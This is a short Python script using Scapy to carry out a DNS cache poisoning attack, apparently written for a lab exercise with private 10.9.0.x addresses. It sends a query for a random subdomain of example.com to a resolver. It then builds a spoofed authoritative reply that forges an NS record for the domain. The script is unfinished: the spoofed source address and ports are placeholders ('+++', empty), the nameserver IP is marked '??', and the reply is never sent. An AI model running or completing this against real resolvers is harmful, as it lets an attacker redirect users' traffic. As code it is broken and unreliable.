#!/usr/bin/env python3
from scapy.all import * 
import random, string

def randomword(length):
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(length))

attackerIP = "10.9.0.1"
apoloIP = "10.9.0.53"
#nsIP = ??

domain = 'example.com'
name = randomword(5) + '.' + domain 
port = RandShort()
ns = '1.2.3.4'

# Send request
Qdsec = DNSQR(qname=name)
dns = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0,arcount=0, qd=Qdsec)
ip = IP(dst=apoloIP, src=attackerIP)
udp = UDP(dport=53, sport=port, chksum=0)
request = ip/udp/dns

send(request)

# Send answers 
Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)
NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0,
    qd=Qdsec, an=Anssec, ns=NSsec)
ip = IP(dst=apoloIP, src='+++')
udp = UDP(dport='', sport='+++', chksum=0)
reply = ip/udp/dns